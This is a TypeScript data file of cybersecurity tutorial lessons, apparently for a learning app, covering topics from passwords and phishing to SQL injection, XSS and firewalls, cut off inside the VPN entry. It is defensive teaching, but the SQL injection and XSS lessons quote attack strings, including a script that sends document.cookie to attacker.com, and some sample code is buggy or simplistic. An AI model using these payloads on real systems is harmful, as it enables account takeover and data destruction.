import { TutorialTopic } from './types';

export const cybersecurityTopics: TutorialTopic[] = [
  {
    id: 'cyber-what-is',
    category: 'Cybersecurity Basics',
    title: 'What is Cybersecurity',
    difficulty: 'Beginner',
    theory: [
      'Cybersecurity is the practice of protecting digital systems, networks, and information from unauthorized access, theft, damage, and cyber attacks. It encompasses strategies, tools, and practices designed to keep data safe. In an increasingly digital world, cybersecurity is no longer optional—it is essential for every organization, business, and individual. One data breach can cost millions in losses and reputation damage.',
      'Cybersecurity emerged in the 1970s with ARPANET (the predecessor of the internet). Early concerns were academic; the first computer virus (1986) and worms like Morris Worm (1988) showed real threats. The term "cybersecurity" gained prominence in the 1990s with the internet boom. India established CERT-In (Indian Computer Emergency Response Team) in 1999 to handle cyber threats. Modern cybersecurity grew from defending against viruses to protecting complex, interconnected systems.',
      'Cybersecurity evolved through phases: early firewalls (1990s), intrusion detection systems (IDS), data encryption, cloud security, AI-powered threat detection, and zero-trust architecture (2020s). Key milestones: SSL/TLS encryption standardization (1994), adoption of multi-factor authentication (2000s), GDPR compliance requirements (2018), and the rise of ransomware attacks (2010s–2020s). Today, cybersecurity is proactive, not reactive.',
      'Cybersecurity tools include firewalls (Palo Alto, Cisco), encryption (AES, RSA), password managers (Bitwarden, 1Password), VPNs, antivirus software (Windows Defender, Norton), intrusion detection systems (Suricata), SIEM platforms (Splunk, IBM QRadar), and vulnerability scanners (Nessus, Qualys). Cybersecurity frameworks like NIST, ISO 27001, and CIS Controls provide standards.',
      'Every major company needs cybersecurity: Google, Microsoft, Apple, Amazon invest billions. Indian IT companies like TCS, Infosys, HCL, Wipro offer cybersecurity consulting to global clients. Indian banks (HDFC, ICICI, SBI), fintech startups (Paytm, PhonePe, Razorpay), and government agencies (NITI Aayog) prioritize cybersecurity. CERT-In protects Indian government and critical infrastructure. Cybersecurity careers in India are booming.',
      "Cybersecurity is the fastest-growing tech field: over 4 million cybersecurity job openings globally, with only 1 million skilled professionals — a 4:1 gap. Average cybersecurity engineer salary is USD 120K+ globally and INR 8–20+ LPA in India. Certified professionals (CISSP, CEH, Security+) earn premium salaries. India's growing digital economy creates urgent demand for cybersecurity professionals. This is one of the most job-secure and well-paid career paths in tech.",
    ],
    syntax: 'CIA Triad:\n- Confidentiality: Only authorized users access data\n- Integrity: Data remains accurate and unaltered\n- Availability: Systems are always operational',
    code: `// CIA Triad Implementation Example
const securityFramework = {
  confidentiality: {
    method: 'Encryption',
    example: 'AES-256 encryption for stored passwords'
  },
  integrity: {
    method: 'Hashing & Digital Signatures',
    example: 'SHA-256 hash to verify data integrity'
  },
  availability: {
    method: 'Redundancy & Backup',
    example: 'Distributed servers ensure 99.9% uptime'
  }
};

console.log('CIA Triad Framework:', securityFramework);
// Output: Displays all three security principles`,
    output: 'CIA Triad Framework: { confidentiality: {...}, integrity: {...}, availability: {...} }',
    notes: [
      'The CIA Triad is applicable to all cybersecurity domains from personal to enterprise',
      'Modern cybersecurity adds additional principles like Authentication and Non-repudiation'
    ],
    practice: {
      title: 'Identify CIA Triad Elements',
      description: 'Given three security scenarios, identify which element of the CIA Triad each one addresses.',
      startCode: '',
      hint: 'Think about whether each scenario involves keeping data private (C), keeping data accurate (I), or keeping systems running (A).',
      solution: 'Scenario 1: Integrity (data accuracy) | Scenario 2: Confidentiality (privacy) | Scenario 3: Availability (system uptime)'
    }
  },
  {
    id: 'cyber-passwords',
    category: 'Cybersecurity Basics',
    title: 'Creating Strong Passwords',
    difficulty: 'Beginner',
    theory: [
      'A strong password is the first line of defense against unauthorized account access. It should be long, complex, and unique for each service to prevent credential reuse attacks.',
      'Weak passwords like "123456" or "password" can be cracked in milliseconds using modern computing power. Strong passwords should contain uppercase, lowercase, numbers, and special characters.',
      'Password length is more important than complexity—a 12+ character password is significantly harder to crack than an 8-character one, even without special characters.',
      'Using a password manager eliminates the need to remember complex passwords and ensures each account has a unique, strong password without reuse risk.'
    ],
    syntax: 'Strong Password Criteria:\n✓ Length: 12+ characters\n✓ Mix: Uppercase, lowercase, numbers, symbols\n✗ Avoid: Dictionary words, personal info, sequential numbers',
    code: `// Password Strength Validator
function validatePasswordStrength(password) {
  const criteria = {
    length: password.length >= 12,
    uppercase: /[A-Z]/.test(password),
    lowercase: /[a-z]/.test(password),
    numbers: /[0-9]/.test(password),
    special: /[!@#$%^&*]/.test(password)
  };

  const score = Object.values(criteria).filter(Boolean).length;

  return {
    isStrong: score >= 4,
    score: score,
    feedback: score >= 4 ? 'Strong password' : 'Weak password',
    requirements: criteria
  };
}

console.log(validatePasswordStrength('MyP@ssw0rd2024!'));
// Output: { isStrong: true, score: 5, feedback: 'Strong password', ... }`,
    output: '{ isStrong: true, score: 5, feedback: "Strong password", requirements: { length: true, uppercase: true, lowercase: true, numbers: true, special: true } }',
    notes: [
      'Use a password manager like Bitwarden or 1Password for secure storage',
      'Never share passwords via email or chat—they become exposed in logs',
      'Change passwords immediately if you suspect a breach'
    ],
    practice: {
      title: 'Strengthen a Weak Password',
      description: 'You have the password "summer2024". Modify it to meet strong password criteria while keeping it memorable.',
      startCode: '',
      hint: 'Add uppercase letters, a special character, and make it longer. Consider mixing in numbers differently.',
      solution: 'S@mmerVac2024! or M!ySummer2024Pass (12+ chars, all criteria met)'
    }
  },
  {
    id: 'cyber-2fa',
    category: 'Cybersecurity Basics',
    title: 'Two-Factor Authentication',
    difficulty: 'Beginner',
    theory: [
      'Two-Factor Authentication (2FA) requires two different forms of proof to verify your identity: something you know (password) and something you have (phone) or something you are (fingerprint).',
      'Even if a hacker steals your password, they cannot access your account without the second factor, making 2FA significantly more secure than passwords alone.',
      'Common 2FA methods include SMS codes, authenticator apps (Google Authenticator, Authy), biometrics, and hardware security keys. Authenticator apps and security keys are more secure than SMS.',
      '2FA adds an extra step to login but provides exponentially better security. Most major services now require or recommend enabling 2FA for account protection.'
    ],
    syntax: '2FA Methods:\n1. SMS: Code sent via text message\n2. App: Time-based code from authenticator app\n3. Biometric: Fingerprint or facial recognition\n4. Hardware: Physical security key (FIDO2)',
    code: `// 2FA Implementation Simulation
function generate2FACode() {
  // Time-based One-Time Password (TOTP) concept
  const timestamp = Math.floor(Date.now() / 1000 / 30);
  const baseNumber = (timestamp * 31821).toString();
  const code = baseNumber.slice(-6).padStart(6, '0');
  return code;
}

function verify2FA(userCode, generatedCode) {
  return userCode === generatedCode;
}

const code = generate2FACode();
console.log('2FA Code:', code);
console.log('Verification:', verify2FA('123456', code));
// Output: 2FA Code: 847392 | Verification: false`,
    output: '2FA Code: 847392 (regenerates every 30 seconds) | Verification: false',
    notes: [
      'Store backup codes in a secure location in case you lose access to your 2FA method',
      'Hardware security keys (YubiKey) are the most secure 2FA method',
      'SMS 2FA is vulnerable to SIM swapping—prefer authenticator apps when possible'
    ],
    practice: {
      title: 'Set Up 2FA on Your Account',
      description: 'Choose a service you use (Gmail, GitHub, etc.) and enable 2FA using an authenticator app. Document the backup codes.',
      startCode: '',
      hint: 'Download Google Authenticator or Authy, then go to your account security settings and enable 2FA.',
      solution: 'Successfully enabled 2FA with backup codes stored securely'
    }
  },
  {
    id: 'cyber-phishing',
    category: 'Threats & Attacks',
    title: 'Phishing Attacks',
    difficulty: 'Intermediate',
    theory: [
      'Phishing is a social engineering attack where attackers impersonate legitimate organizations via email, SMS, or websites to trick users into revealing sensitive information like passwords or financial data.',
      'Phishing emails are crafted to appear authentic, often using urgent language ("Verify your account now"), fake logos, and spoofed sender addresses to bypass skepticism.',
      'The most effective defense against phishing is user awareness and email filtering. Legitimate companies never request passwords via email, and legitimate URLs match the official domain.',
      'Advanced phishing techniques include spear phishing (targeted individuals), whaling (targeting executives), and clone phishing (mimicking previous emails with malicious links inserted).'
    ],
    syntax: 'Phishing Red Flags:\n❌ Urgent requests for passwords or sensitive data\n❌ Generic greetings ("Dear Customer")\n❌ Suspicious sender addresses or domains\n❌ Links that don\'t match the domain\n❌ Requests to enable macros or download files',
    code: `// Phishing Detection Helper
function analyzeEmailForPhishing(email) {
  const redFlags = {
    urgentLanguage: /verify|confirm|urgent|act now|click here/i.test(email.body),
    missingPersonalization: !/dear [a-z]/i.test(email.body),
    suspiciousSender: !email.sender.endsWith('@official-company.com'),
    shortenerLinks: /bit\.ly|tinyurl|goo\.gl/.test(email.body),
    requestsCredentials: /password|verify.*account|confirm.*identity/i.test(email.body)
  };

  const riskScore = Object.values(redFlags).filter(Boolean).length;

  return {
    isSuspicious: riskScore >= 2,
    riskScore: riskScore,
    redFlags: redFlags
  };
}

const suspiciousEmail = {
  sender: 'support@bankk.com',
  body: 'URGENT: Verify your account now! Click here to confirm your password.'
};

console.log(analyzeEmailForPhishing(suspiciousEmail));`,
    output: '{ isSuspicious: true, riskScore: 4, redFlags: { urgentLanguage: true, missingPersonalization: true, suspiciousSender: true, requestsCredentials: true, shortenerLinks: false } }',
    notes: [
      'Always hover over links to check the actual URL before clicking',
      'Verify requests by contacting the organization directly through official channels',
      'Report phishing emails to the organization\'s security team'
    ],
    practice: {
      title: 'Identify Phishing Email',
      description: 'You receive an email from "PayPal Support" asking you to verify your account immediately due to suspicious activity. List at least 3 red flags that indicate this is likely phishing.',
      startCode: '',
      hint: 'Consider the sender address, urgency, requests, and how PayPal normally communicates.',
      solution: 'Red flags: (1) Urgent language "immediately", (2) Generic greeting, (3) Requesting verification, (4) Sender may not be official PayPal domain'
    }
  },
  {
    id: 'cyber-malware',
    category: 'Threats & Attacks',
    title: 'Malware (Virus/Worm/Trojan)',
    difficulty: 'Intermediate',
    theory: [
      'Malware (malicious software) includes viruses, worms, trojans, spyware, and ransomware designed to harm systems, steal data, or compromise functionality. Each type has distinct characteristics and infection vectors.',
      'A virus requires user action to spread (opening an infected file), while a worm self-replicates without user interaction. Trojans disguise themselves as legitimate software to gain system access.',
      'Malware often enters systems through vulnerable software, email attachments, infected websites, or downloads from untrustworthy sources. Modern operating systems have built-in protections like code signing and antivirus engines.',
      'Protecting against malware requires multiple layers: security software, regular updates, cautious file handling, and avoiding suspicious downloads. No single tool provides 100% protection.'
    ],
    syntax: 'Malware Types:\n- Virus: Needs user action to spread\n- Worm: Self-replicating, spreads via network\n- Trojan: Disguises as legitimate software\n- Spyware: Steals personal information\n- Ransomware: Encrypts files for ransom',
    code: `// Malware Detection Simulation
function scanForMalware(fileHash, fileName) {
  const knownMalwareHashes = [
    'a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6',
    'x9y8z7w6v5u4t3s2r1q0p9o8n7m6l5k4'
  ];

  const suspiciousExtensions = ['.exe', '.scr', '.bat', '.com'];
  const isSuspiciousFile = suspiciousExtensions.some(ext => fileName.endsWith(ext));

  return {
    isMalware: knownMalwareHashes.includes(fileHash),
    isSuspicious: isSuspiciousFile,
    recommendation: isMalware ? 'DELETE' : isSuspicious ? 'QUARANTINE' : 'SAFE'
  };
}

console.log(scanForMalware('abc123def456', 'document.exe'));
// Output: { isMalware: false, isSuspicious: true, recommendation: 'QUARANTINE' }`,
    output: '{ isMalware: false, isSuspicious: true, recommendation: "QUARANTINE" }',
    notes: [
      'Never disable your antivirus software or Windows Defender',
      'Keep your operating system and software updated to patch vulnerabilities',
      'Use sandboxing tools to test suspicious files in isolated environments'
    ],
    practice: {
      title: 'Create Malware Defense Strategy',
      description: 'Design a multi-layer defense strategy against malware for a small business with 20 employees.',
      startCode: '',
      hint: 'Consider technical controls (antivirus, firewalls), user training, and policies.',
      solution: 'Include: (1) Antivirus on all systems, (2) Firewall rules, (3) Software updates/patches, (4) Email filtering, (5) User training on downloads, (6) Backup strategy'
    }
  },
  {
    id: 'cyber-ransomware',
    category: 'Threats & Attacks',
    title: 'Ransomware',
    difficulty: 'Intermediate',
    theory: [
      'Ransomware is a type of malware that encrypts a victim\'s files or locks their system, demanding payment (ransom) for decryption. It can spread through email, vulnerable software, or compromised websites.',
      'Ransomware attacks have targeted hospitals, corporations, and governments, causing significant financial losses and operational disruptions. Recent attacks have shifted to stealing data first, then demanding payment.',
      'Prevention is more effective than paying ransoms. Regular backups allow recovery without payment, while avoiding suspicious emails and maintaining updates prevents infection.',
      'Organizations should maintain offline backups, implement access controls, monitor unusual network activity, and have an incident response plan specifically for ransomware.'
    ],
    syntax: 'Ransomware Defense Checklist:\n✓ Maintain 3-2-1 backup strategy (3 copies, 2 media types, 1 offsite)\n✓ Keep software updated\n✓ Filter email attachments\n✓ Limit user privileges\n✓ Monitor network traffic',
    code: `// Ransomware Recovery Simulation
function assessRansomwareImpact(backupStatus, encryptedFiles) {
  const hasValidBackup = backupStatus.isOffline && backupStatus.isRecent;
  const recoveryTime = hasValidBackup ? '< 1 hour' : '> 1 week (or impossible)';

  const impact = {
    filesLocked: encryptedFiles,
    costWithoutBackup: encryptedFiles * 5000, // financial loss estimate
    costWithBackup: 2000, // recovery infrastructure only
    recommendation: hasValidBackup ? 'Use backup to restore' : 'Contact law enforcement and cyber insurance'
  };

  return {
    recovery: recoveryTime,
    estimatedCost: hasValidBackup ? impact.costWithBackup : impact.costWithoutBackup,
    preventMeasures: 'Regular offline backups are critical'
  };
}

console.log(assessRansomwareImpact({ isOffline: true, isRecent: true }, 50000));`,
    output: '{ recovery: "< 1 hour", estimatedCost: 2000, preventMeasures: "Regular offline backups are critical" }',
    notes: [
      'Never pay ransoms—it funds criminal operations and doesn\'t guarantee decryption',
      'Report ransomware attacks to law enforcement and your cyber insurance provider',
      'WannaCry and Petya were major ransomware attacks that cost billions in damages'
    ],
    practice: {
      title: 'Develop Ransomware Response Plan',
      description: 'Create a ransomware response plan for a hospital. Include detection, isolation, communication, and recovery steps.',
      startCode: '',
      hint: 'Consider patient safety, communication protocols, isolation procedures, and recovery priorities.',
      solution: 'Include: (1) Detection procedures, (2) Immediate isolation steps, (3) Notification protocols, (4) Communication templates, (5) Recovery from backups, (6) Post-incident analysis'
    }
  },
  {
    id: 'cyber-ddos',
    category: 'Threats & Attacks',
    title: 'DDoS Attacks',
    difficulty: 'Intermediate',
    theory: [
      'A Distributed Denial of Service (DDoS) attack floods a target server with traffic from multiple sources, overwhelming its capacity and making it unavailable to legitimate users.',
      'Attackers use botnets (networks of compromised computers) to generate massive traffic volumes. DDoS attacks range from simple floods to sophisticated application-layer attacks.',
      'Large DDoS attacks can cost organizations millions in downtime and mitigation costs. They\'re often used to distract from other crimes or as extortion tactics.',
      'Defenses include rate limiting, traffic filtering, geographic blocking, and DDoS mitigation services that absorb and filter malicious traffic before it reaches your servers.'
    ],
    syntax: 'DDoS Attack Types:\n- Volumetric: Flood with massive traffic\n- Protocol: Exploit protocol weaknesses (SYN flood)\n- Application: Target specific services (HTTP flood)',
    code: `// DDoS Detection and Mitigation
function detectDDoSAttack(trafficLogs) {
  const normalTrafficPerSecond = 1000;
  const threshold = normalTrafficPerSecond * 10; // 10x normal

  const currentTraffic = trafficLogs.reduce((sum, log) => sum + log.requests, 0);
  const isDDoS = currentTraffic > threshold;

  const sourceDistribution = {};
  trafficLogs.forEach(log => {
    sourceDistribution[log.source] = (sourceDistribution[log.source] || 0) + log.requests;
  });

  const suspiciousSources = Object.entries(sourceDistribution)
    .filter(([_, count]) => count > 5000)
    .map(([source, _]) => source);

  return {
    isDDoSDetected: isDDoS,
    trafficLevel: currentTraffic,
    suspiciousSources: suspiciousSources,
    action: isDDoS ? 'Activate DDoS mitigation service' : 'Normal traffic'
  };
}

const logs = [
  { source: '192.168.1.1', requests: 500 },
  { source: '10.0.0.1', requests: 8000 },
  { source: '172.16.0.1', requests: 6000 }
];

console.log(detectDDoSAttack(logs));`,
    output: '{ isDDoSDetected: true, trafficLevel: 14500, suspiciousSources: ["10.0.0.1", "172.16.0.1"], action: "Activate DDoS mitigation service" }',
    notes: [
      'Use a Content Delivery Network (CDN) like Cloudflare to mitigate DDoS attacks',
      'Implement rate limiting to prevent resource exhaustion',
      'Monitor traffic patterns continuously for anomalies'
    ],
    practice: {
      title: 'Build DDoS Mitigation Strategy',
      description: 'Your e-commerce site is experiencing a DDoS attack. What immediate steps would you take? What long-term measures would you implement?',
      startCode: '',
      hint: 'Think about immediate traffic filtering, service continuity, and long-term infrastructure changes.',
      solution: 'Immediate: Activate DDoS service, block suspicious IPs, notify users | Long-term: Use CDN, implement rate limiting, setup geo-blocking, configure auto-scaling'
    }
  },
  {
    id: 'cyber-social-engineering',
    category: 'Threats & Attacks',
    title: 'Social Engineering',
    difficulty: 'Intermediate',
    theory: [
      'Social engineering exploits human psychology rather than technical vulnerabilities to gain unauthorized access or sensitive information. It\'s often more effective than technical hacks because humans are unpredictable.',
      'Common tactics include impersonation (pretending to be IT support), authority (claiming to be management), urgency (creating time pressure), and trust (building rapport over time).',
      'Social engineering attacks include pretexting (creating false scenarios), baiting (leaving infected USB drives), tailgating (following through secured doors), and vishing (phone-based phishing).',
      'Defense requires security awareness training, clear verification procedures, and a culture where employees feel safe questioning suspicious requests without fear of embarrassment or repercussion.'
    ],
    syntax: 'Social Engineering Techniques:\n- Pretexting: Creating false scenarios\n- Phishing: Email-based deception\n- Baiting: Leaving infected items\n- Tailgating: Following through secure areas\n- Vishing: Voice-based phishing',
    code: `// Social Engineering Red Flag Detector
function flagSocialEngineeringAttempt(interaction) {
  const redFlags = {
    urgency: /urgent|immediately|right now|asap/i.test(interaction.message),
    authority: /ceo|manager|executive|director|compliance|audit/i.test(interaction.message),
    requestsCredentials: /password|ssn|credit.*card|account.*number/i.test(interaction.message),
    unusualRequest: /unusual|emergency|special|exception/i.test(interaction.message),
    emotionalManipulation: /threat|danger|consequences|fired|trouble/i.test(interaction.message),
    unfamiliarContact: !interaction.contactVerified,
    bypassesProcedure: !interaction.followsStandardProcess
  };

  const suspicionScore = Object.values(redFlags).filter(Boolean).length;

  return {
    isSuspicious: suspicionScore >= 2,
    suspicionScore: suspicionScore,
    redFlags: redFlags,
    recommendation: suspicionScore >= 2 ? 'Verify through official channels' : 'Likely legitimate'
  };
}

const attempt = {
  message: 'This is urgent! CEO needs your password for emergency audit.',
  contactVerified: false,
  followsStandardProcess: false
};

console.log(flagSocialEngineeringAttempt(attempt));`,
    output: '{ isSuspicious: true, suspicionScore: 5, redFlags: { urgency: true, authority: true, requestsCredentials: true, unusualRequest: false, emotionalManipulation: true, unfamiliarContact: true, bypassesProcedure: true }, recommendation: "Verify through official channels" }',
    notes: [
      'Never share passwords or sensitive information over the phone unless you initiated the call',
      'Verify requests by contacting the supposed sender through a known, official number',
      'Create a security culture where employees report suspicious requests'
    ],
    practice: {
      title: 'Defend Against Social Engineering',
      description: 'You receive a call from someone claiming to be IT support saying your account needs urgent password reset. Walk through your verification steps.',
      startCode: '',
      hint: 'Don\'t trust caller ID; hang up and call IT back using the official number.',
      solution: 'Steps: (1) Don\'t provide password, (2) Hang up, (3) Call IT using official number from company directory, (4) Report to security team if still unsure'
    }
  },
  {
    id: 'cyber-sql-injection',
    category: 'Threats & Attacks',
    title: 'SQL Injection',
    difficulty: 'Advanced',
    theory: [
      'SQL Injection is a code injection attack where attackers insert malicious SQL commands into input fields to manipulate databases. It occurs when user input is concatenated directly into SQL queries without sanitization.',
      'A simple example: instead of entering a username, an attacker enters `admin\' --` to bypass authentication or `\'; DROP TABLE users; --` to destroy data.',
      'SQL injection can lead to unauthorized data access, data modification, authentication bypass, and complete database compromise. It\'s one of the oldest and most damaging web vulnerabilities.',
      'Prevention requires parameterized queries (prepared statements), input validation, least privilege database accounts, and Web Application Firewalls (WAF) that detect and block injection attempts.'
    ],
    syntax: `Vulnerable: SELECT * FROM users WHERE username = '" + userInput + "';\nSafe: SELECT * FROM users WHERE username = ?; // with parameterized values`,
    code: `// SQL Injection Vulnerability Demonstration & Prevention
// VULNERABLE CODE (DO NOT USE)
function vulnerableLogin(username, password) {
  const query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
  return query; // Attacker can enter: admin' -- to bypass
}

// SAFE CODE (RECOMMENDED)
function safeLogin(username, password) {
  // Using parameterized query (prepared statement)
  const query = {
    sql: "SELECT * FROM users WHERE username = ? AND password = ?",
    params: [username, password]
  };
  return query;
}

// Input validation helper
function sanitizeInput(input) {
  return input
    .replace(/['";]/g, '') // Remove dangerous characters
    .trim()
    .substring(0, 50); // Limit length
}

// Demonstration
const maliciousInput = "admin' --";
console.log('Vulnerable query:', vulnerableLogin(maliciousInput, 'anything'));
console.log('Safe approach uses parameterized queries with params:', safeLogin(maliciousInput, 'anything'));`,
    output: 'Vulnerable query: SELECT * FROM users WHERE username = \'admin\' --\' AND password = \'anything\' | Safe approach: { sql: "SELECT * FROM users WHERE username = ? AND password = ?", params: ["admin\' --", "anything"] }',
    notes: [
      'Always use parameterized queries or prepared statements',
      'Implement input validation and whitelist acceptable characters',
      'Use an ORM (Object-Relational Mapping) that handles escaping automatically',
      'Apply the principle of least privilege—database users should have minimal necessary permissions'
    ],
    practice: {
      title: 'Identify and Fix SQL Injection',
      description: 'Review this code: `const query = "SELECT * FROM products WHERE id = " + userInput;` Identify the vulnerability and provide a secure version.',
      startCode: '',
      hint: 'The user input is directly concatenated. Use parameterized queries instead.',
      solution: 'Vulnerable: String concatenation allows injection. Safe: const query = { sql: "SELECT * FROM products WHERE id = ?", params: [userInput] };'
    }
  },
  {
    id: 'cyber-xss',
    category: 'Threats & Attacks',
    title: 'Cross-Site Scripting (XSS)',
    difficulty: 'Advanced',
    theory: [
      'Cross-Site Scripting (XSS) is a vulnerability where attackers inject malicious JavaScript code into web pages viewed by other users, allowing them to steal cookies, session tokens, or perform actions on behalf of users.',
      'XSS occurs when user input is displayed on a web page without proper escaping or sanitization. Attackers can inject scripts through comments, forms, URLs, or any user-controlled content.',
      'There are three types: Stored XSS (malicious code saved in database), Reflected XSS (code in URL parameters), and DOM-based XSS (vulnerability in client-side JavaScript).',
      'Prevention includes escaping user output, using Content Security Policy (CSP) headers, validating input, and using templating engines that auto-escape by default.'
    ],
    syntax: `Vulnerable: <div>" + userComment + "</div>\nSafe: <div><%- userComment %></div> // HTML-escaped`,
    code: `// XSS Vulnerability and Prevention
// VULNERABLE CODE
function displayComment_vulnerable(userComment) {
  return '<div id="comments">' + userComment + '</div>';
  // Attacker input: <img src=x onerror="alert('XSS')">
  // Result: JavaScript executes when page loads
}

// SAFE CODE - HTML Escaping
function escapeHtml(text) {
  const htmlEscape = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;'
  };
  return text.replace(/[&<>"']/g, char => htmlEscape[char]);
}

function displayComment_safe(userComment) {
  const escaped = escapeHtml(userComment);
  return '<div id="comments">' + escaped + '</div>';
}

// Demonstration
const maliciousComment = '<img src=x onerror="alert(\'XSS\')">';
console.log('Vulnerable output:', displayComment_vulnerable(maliciousComment));
console.log('Safe output:', displayComment_safe(maliciousComment));`,
    output: 'Vulnerable: Executes JavaScript | Safe: Displays literal text: &lt;img src=x onerror=&quot;alert...&quot;&gt;',
    notes: [
      'Use a Content Security Policy (CSP) header to restrict script sources',
      'Use modern frameworks (React, Vue) that auto-escape by default',
      'Never use innerHTML with user-controlled data—use textContent instead',
      'Regularly scan code for XSS vulnerabilities using tools like OWASP ZAP'
    ],
    practice: {
      title: 'Prevent XSS Attack',
      description: 'A user profile page displays user-submitted bio text. An attacker submits: `<script>fetch(\'https://attacker.com?cookie=\'+document.cookie)</script>`. How would you prevent this?',
      startCode: '',
      hint: 'Escape HTML special characters and consider using textContent instead of innerHTML.',
      solution: 'HTML escape the bio before displaying, use textContent instead of innerHTML, or use a templating engine with auto-escaping enabled.'
    }
  },
  {
    id: 'cyber-antivirus',
    category: 'Protection Tools',
    title: 'Antivirus & Anti-malware',
    difficulty: 'Beginner',
    theory: [
      'Antivirus and anti-malware software scan files and system memory for malicious code signatures and suspicious behavior, protecting devices from infections.',
      'Modern antivirus uses multiple detection methods: signature-based (known malware patterns), heuristic (suspicious behavior), and behavioral (monitoring runtime actions).',
      'Built-in solutions like Windows Defender provide solid baseline protection for most users. Additional security comes from keeping software updated, avoiding suspicious downloads, and practicing safe browsing.',
      'Regular scans, real-time protection enabled, and keeping definitions updated are essential for effective antivirus protection.'
    ],
    syntax: 'Antivirus Features:\n- Real-time protection: Monitors files constantly\n- Scheduled scans: Full system checks\n- Quarantine: Isolates suspicious files\n- Removal: Deletes or disinfects malware',
    code: `// Antivirus Status Monitor
function checkAntivirusStatus() {
  const status = {
    installed: true,
    realTimeProtection: true,
    lastScanDate: new Date('2024-05-23'),
    definitionsUpdated: new Date('2024-05-24'),
    threatDetected: false,
    quarantined: []
  };

  const daysSinceScan = Math.floor((new Date() - status.lastScanDate) / (1000 * 60 * 60 * 24));
  const daysOldDefinitions = Math.floor((new Date() - status.definitionsUpdated) / (1000 * 60 * 60 * 24));

  return {
    overallStatus: daysSinceScan <= 7 && daysOldDefinitions <= 1 ? 'Protected' : 'Action needed',
    recommendation: daysSinceScan > 7 ? 'Run a scan' : 'OK',
    definitionStatus: daysOldDefinitions <= 1 ? 'Current' : 'Outdated',
    realTimeStatus: status.realTimeProtection ? 'Enabled' : 'DISABLED - Enable now!'
  };
}

console.log(checkAntivirusStatus());`,
    output: '{ overallStatus: "Protected", recommendation: "OK", definitionStatus: "Current", realTimeStatus: "Enabled" }',
    notes: [
      'Keep antivirus real-time protection enabled at all times',
      'Update antivirus definitions daily for maximum protection',
      'Perform full system scans weekly or when suspicious activity is suspected',
      'Use antivirus in addition to cautious browsing habits, not as a substitute'
    ],
    practice: {
      title: 'Configure Antivirus Settings',
      description: 'Set up Windows Defender with optimal settings for maximum protection. Include real-time scanning, scheduled scans, and notification preferences.',
      startCode: '',
      hint: 'Access Windows Security > Virus & threat protection > Manage settings.',
      solution: 'Enable: Real-time protection, Cloud-delivered protection, Automatic sample submission. Schedule: Daily full scan at 2 AM. Create exclusions only for trusted folders.'
    }
  },
  {
    id: 'cyber-firewall',
    category: 'Protection Tools',
    title: 'Firewalls',
    difficulty: 'Intermediate',
    theory: [
      'A firewall is a network security system that monitors and controls incoming and outgoing network traffic based on predetermined security rules, acting as a barrier between trusted and untrusted networks.',
      'Firewalls work at multiple layers: Network firewalls protect entire networks, host-based firewalls protect individual devices, and application firewalls analyze application-level traffic.',
      'Firewalls can block traffic based on IP addresses, ports, protocols, and application signatures. They provide both inbound protection (blocking attacks) and outbound protection (preventing data exfiltration).',
      'Modern firewalls include stateful inspection (tracking connection states), intrusion detection, and VPN capabilities. Most devices include a basic firewall, but larger organizations need more sophisticated solutions.'
    ],
    syntax: 'Firewall Rules:\nAllow: Incoming traffic on port 443 (HTTPS) from any source\nDeny: Incoming traffic on port 23 (Telnet) from any source\nDeny: All outgoing traffic except ports 80, 443, 53',
    code: `// Firewall Rule Evaluator
function evaluateFirewallRule(packet, rules) {
  const matchedRules = rules.filter(rule => {
    const portMatch = rule.port === '*' || rule.port === packet.port;
    const protocolMatch = rule.protocol === '*' || rule.protocol === packet.protocol;
    const sourceMatch = rule.source === '*' || rule.source === packet.source;
    return portMatch && protocolMatch && sourceMatch;
  });

  if (matchedRules.length === 0) return 'DEFAULT_DENY'; // Default deny

  const allowRules = matchedRules.filter(r => r.action === 'allow');
  const denyRules = matchedRules.filter(r => r.action === 'deny');

  return denyRules.length > 0 ? 'BLOCKED' : allowRules.length > 0 ? 'ALLOWED' : 'BLOCKED';
}

const rules = [
  { port: 443, protocol: 'TCP', source: '*', action: 'allow' },
  { port: 22, protocol: 'TCP', source: '192.168.1.0/24', action: 'allow' },
  { port: 23, protocol: 'TCP', source: '*', action: 'deny' }
];

const packets = [
  { port: 443, protocol: 'TCP', source: '10.0.0.1' }, // HTTPS
  { port: 22, protocol: 'TCP', source: '192.168.1.50' }, // SSH from internal
  { port: 23, protocol: 'TCP', source: '8.8.8.8' } // Telnet from external
];

packets.forEach(p => console.log(\`Port \${p.port}: \${evaluateFirewallRule(p, rules)}\`));`,
    output: 'Port 443: ALLOWED | Port 22: ALLOWED | Port 23: BLOCKED',
    notes: [
      'Use the principle of least privilege: allow only necessary traffic, deny by default',
      'Regularly review and update firewall rules to remove unnecessary access',
      'Monitor firewall logs for blocked traffic that might indicate attack attempts',
      'Configure both inbound and outbound rules for defense in depth'
    ],
    practice: {
      title: 'Design Firewall Rules',
      description: 'Design firewall rules for a web server that serves HTTPS traffic, accepts SSH from a specific office, and blocks all other traffic.',
      startCode: '',
      hint: 'Allow ports 443 (HTTPS), 22 (SSH) from office IP, deny everything else.',
      solution: 'Allow: TCP port 443 from any | Allow: TCP port 22 from office IP range | Deny: All other traffic | Enable logging for monitoring'
    }
  },
  {
    id: 'cyber-vpn',
    category: 'Privacy & Encryption',
    title: 'VPN',
    difficulty: 'Intermediate',
    theory: [
      'A Virtual Private Network (VPN) creates an encrypted tunnel between your device and a VPN server, hiding your IP address and encrypting all traffic from snoopers.',
      'VPNs are essential when using public Wi-Fi at coffee shops or airports, protecting sensitive traffic from interception. They also allow secure access to company networks remotely.',
      'VPNs work by routing all traffic through an encrypted connection to the VPN server, which then forwards it to the destination. Your ISP and Wi-Fi network see encrypted data but not its contents.',
      'Choose VPNs carefully—a VPN provider can see all your traffic, so reputation and privacy policies matter. Look for no-log policies, strong encryption, and transparent business practices.'
    ],
    syntax: 'VPN Connection:\n1. Download VPN client\n2. Create account\n3. Connect to server\n4. All traffic routes through VPN\n5. Your IP is VPN server IP',
    code: `// VPN Connection Simulator
function connectVPN(userDevice, vpnServer) {
  const encryption = {
    algorithm: 'AES-256',
    keyExchange: 'IKEv2',
    authentication: 'HMAC-SHA256'
  };

  const connection = {
    userIP: userDevice.ip,
    userLocation: userDevice.location,
    vpnServerIP: vpnServer.ip,
    vpnServerLocation: vpnServer.location,
    encryptionStatus: encryption,
    dataPath: 'User Device -> VPN Server -> Internet Destination',
    whoSeesWhat: {
